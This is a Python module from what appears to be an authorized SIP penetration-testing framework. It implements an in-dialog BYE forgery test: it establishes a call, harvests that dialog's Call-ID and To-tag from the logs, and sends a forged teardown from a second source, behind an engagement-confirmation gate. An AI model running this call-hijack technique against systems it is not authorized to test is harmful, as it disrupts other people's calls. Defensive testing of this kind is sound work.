"""
scenarios/bye_spoof.py

In-dialog request forgery / session hijacking: tests something none of
the other scenarios touch - whether the target validates that a BYE for
an existing dialog actually comes from a party to that dialog (correct
dialog-state tracking / topology hiding), rather than accepting any
request that happens to carry a matching Call-ID and To-tag regardless
of where it came from.

Two real local source IPs are required, doing two sequential things:
  1. `caller_ip` runs bye_spoof_establish.xml: a normal, complete call
     setup (INVITE -> 200 -> ACK) that is deliberately never torn down.
  2. This scenario harvests the real Call-ID and the target-assigned
     To-tag from that run's own -message_file transcript, then
     `spoofer_ip` - a genuinely different real local source, never the
     network-layer-spoofed source the project's guardrails forbid -
     sends a single BYE for that same dialog via bye_spoof_hijack.xml.

If the target tears the call down anyway, that's the hijack succeeding.
This is exactly the real attack precondition too: an attacker who has
observed or guessed a dialog's Call-ID/tags (having compromised one
leg, or being on-path) attempting to terminate a call they were never
part of.

Tier: active - requires --confirm <engagement_id>. Sends real (if few)
requests against a live dialog and forges an in-dialog request, hence
active rather than baseline despite the low volume.

Real SIPp constraint discovered building this, confirmed against a real
mock target before it ever reached the integration script (the same
practice that caught the [authentication] and SuccessfulCall(P)-vs-(C)
issues in digest_bruteforce/user_enum): SIPp correlates an incoming
response to one of its own open calls using the Call-ID *it* generated
internally via [call_id] for that call, not a literal comparison
against whatever's in the packet - so bye_spoof_hijack.xml, which
deliberately sends someone else's real Call-ID via -inf rather than
[call_id] (the whole point of the scenario), can never have its
response recognized by SIPp's own matching. The target's real 200/403/
drop is still captured correctly in the hijack run's own -message_file
transcript regardless - SuccessfulCall/FailedCall in stats.csv is not a
usable signal for this one scenario, unlike every other scenario here
that relies on it; _first_response_code() below reads the transcript
directly instead.
"""

from __future__ import annotations

import re
from pathlib import Path

from ..core.engagement import EngagementRefused
from ..core.sipp_runner import run_sipp
from .base import SIPP_XML_DIR, BaseScenario, ScenarioResult

CALL_ID_RE = re.compile(r"^Call-ID:\s*(.+)$", re.MULTILINE)
TO_TAG_RE = re.compile(r"^To:.*?;tag=([^;>\r\n]+)", re.MULTILINE)
STATUS_LINE_RE = re.compile(r"^SIP/2\.0 (\d{3})", re.MULTILINE)


def _harvest_dialog(messages_log: Path) -> tuple[str, str] | None:
    """Pulls the real Call-ID and target-assigned To-tag out of the
    establish call's own sipp -message_file transcript, which contains
    the full raw text of everything sent and received - not stubbed,
    not re-derived, the actual values SIPp used on the wire."""
    if not messages_log.exists():
        return None
    text = messages_log.read_text(errors="replace")
    call_id_match = CALL_ID_RE.search(text)
    to_tag_match = TO_TAG_RE.search(text)
    if not call_id_match or not to_tag_match:
        return None
    return call_id_match.group(1).strip(), to_tag_match.group(1).strip()


def _write_hijack_csv(path: Path, call_id: str, to_tag: str) -> None:
    # SIPp's -inf data files require an order-mode directive as their
    # first line, and use ';' as the field delimiter by default - see
    # user_enum.py's docstring for the fuller account.
    path.write_text(f"SEQUENTIAL\n{call_id};{to_tag}\n")


def _first_response_code(messages_log: Path) -> int | None:
    """Reads the hijack call's real response status directly out of its
    own -message_file transcript rather than sipp's own stats.csv - see
    the module docstring for why SuccessfulCall/FailedCall can't be
    trusted for this specific scenario. A request line never starts
    with "SIP/2.0" (it's "METHOD uri SIP/2.0"), so the first match is
    unambiguously the first received response's status, retransmissions
    of the same response included. None means no response was ever
    received at all - a silent drop, distinct from an explicit 403."""
    if not messages_log.exists():
        return None
    text = messages_log.read_text(errors="replace")
    m = STATUS_LINE_RE.search(text)
    return int(m.group(1)) if m else None


class ByeSpoof(BaseScenario):
    name = "bye_spoof"
    tier = "active"
    description = (
        "In-dialog request forgery - establishes one real call from "
        "--caller-ip, then attempts to tear it down with a forged BYE "
        "carrying that dialog's real Call-ID/To-tag, sent from a different "
        "real source (--spoofer-ip). Validates whether the target checks "
        "that in-dialog requests actually come from a party to the dialog."
    )

    def run(
        self,
        target: str,
        port: int = 5060,
        transport: str = "udp",
        confirm: str | None = None,
        results_root: Path | None = None,
        caller_ip: str | None = None,
        spoofer_ip: str | None = None,
        **kwargs,
    ) -> ScenarioResult:
        if not caller_ip or not spoofer_ip:
            return ScenarioResult(
                scenario=self.name, target=target, allowed=False,
                refusal_reason=(
                    "bye_spoof requires --caller-ip and --spoofer-ip (two distinct "
                    "real local IPs bound on this host)."
                ),
            )
        if caller_ip == spoofer_ip:
            return ScenarioResult(
                scenario=self.name, target=target, allowed=False,
                refusal_reason="--caller-ip and --spoofer-ip must be different addresses.",
            )

        try:
            # Fixed, small real request volume regardless of --rate/
            # --duration - this scenario is one call setup plus one
            # forged teardown attempt, not a flood: INVITE + ACK + BYE.
            self.engagement.gate(
                action=f"scenario:{self.name}",
                target=target,
                tier=self.tier,
                confirm_engagement_id=confirm,
                rate=3,
                duration=1,
            )
        except EngagementRefused as e:
            return ScenarioResult(scenario=self.name, target=target, allowed=False, refusal_reason=str(e))

        results_dir = (results_root or Path("results")) / self.name / target.replace(":", "_")

        establish_result = run_sipp(
            target=target, port=port,
            scenario_file=SIPP_XML_DIR / "bye_spoof_establish.xml",
            rate=1, total_calls=1, transport=transport,
            results_dir=results_dir / "establish", local_ip=caller_ip,
        )

        dialog = _harvest_dialog(establish_result.results_dir / "messages.log")
        if dialog is None:
            return ScenarioResult(
                scenario=self.name, target=target, allowed=True,
                sipp_result=establish_result,
                summary={
                    "caller_ip": caller_ip,
                    "spoofer_ip": spoofer_ip,
                    "dialog_established": False,
                    "hijack_attempted": False,
                    "interpretation": (
                        "The establish call never got a matching 200 (or its To-tag "
                        "couldn't be parsed back out) - no dialog exists to attempt to "
                        "hijack. Check establish_result's own stats/messages log."
                    ),
                },
            )
        call_id, to_tag = dialog

        hijack_csv = results_dir / "hijack.csv"
        _write_hijack_csv(hijack_csv, call_id, to_tag)
        hijack_result = run_sipp(
            target=target, port=port,
            scenario_file=SIPP_XML_DIR / "bye_spoof_hijack.xml",
            rate=1, total_calls=1, transport=transport,
            results_dir=results_dir / "hijack", local_ip=spoofer_ip,
            extra_args=["-inf", str(hijack_csv)],
        )

        response_code = _first_response_code(hijack_result.results_dir / "messages.log")

        return ScenarioResult(
            scenario=self.name, target=target, allowed=True,
            sipp_result=hijack_result,
            summary={
                "caller_ip": caller_ip,
                "spoofer_ip": spoofer_ip,
                "dialog_established": True,
                "hijack_attempted": True,
                "hijack_response_code": response_code,
                "hijack_bye_accepted": response_code == 200,
                "interpretation": (
                    "hijack_bye_accepted: true (response 200) means the target tore down "
                    "a real call in response to a BYE from a source that was never part "
                    "of that dialog - it isn't validating in-dialog request origin. false "
                    "means the forged BYE was rejected (see hijack_response_code, e.g. "
                    "403) or silently dropped (hijack_response_code: null)."
                ),
            },
        )
